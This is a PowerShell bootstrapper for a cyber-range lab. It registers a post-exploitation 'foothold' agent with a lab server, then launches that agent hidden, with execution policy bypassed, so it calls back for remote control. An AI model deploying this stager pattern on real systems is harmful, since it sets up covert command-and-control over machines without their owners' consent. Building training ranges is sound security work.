# va-boot.ps1 — range agent bootstrapper (Enclave lab), v2: waits for the network.
# Arms the governed channel, (re)registers the range agent (survives channel re-arms and
# server restarts), then launches the real agent against the CURRENT channel port.
# v1 raced the DHCP/stack at autologon and exited 1 with no retry — v2 loops up to 4 min
# and logs every step to C:\Windows\Temp\va-boot.log.
$ErrorActionPreference = 'SilentlyContinue'
$log = 'C:\Windows\Temp\va-boot.log'
function Log($m) { "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $m" | Out-File -Append -Encoding utf8 $log }
Log 'va-boot start (v2)'
$api = 'http://192.168.50.1:8971'
$reg = $null
for ($i = 0; $i -lt 48 -and -not $reg; $i++) {
  try {
    $null = Invoke-RestMethod -Method Post -Uri "$api/api/channel/arm" -TimeoutSec 5
    $r = Invoke-RestMethod -Method Post -Uri "$api/api/channel/agent" -ContentType 'application/json' -TimeoutSec 5 -Body '{"action":"register","label":"win11-range-foothold","tags":["range","win11","postex-demo"]}'
    if ($r.agentId) { $reg = $r }
  } catch { Log "attempt $i failed: $($_.Exception.Message)" }
  if (-not $reg) { Start-Sleep -Seconds 5 }
}
if (-not $reg) { Log 'FATAL: could not register after 48 attempts'; exit 1 }
Log "registered as $($reg.agentId)"
$port = (Invoke-RestMethod -Uri "$api/api/channel" -TimeoutSec 5).port
Log "channel port $port, launching agent"
Start-Process powershell -WindowStyle Hidden -ArgumentList @(
  '-ExecutionPolicy','Bypass','-WindowStyle','Hidden',
  '-File','C:\Windows\Temp\varvel-agent.ps1',
  '-Url',"http://192.168.50.1:$port",
  '-AgentId',$reg.agentId,
  '-Token',$reg.token
)
Log 'agent launched'
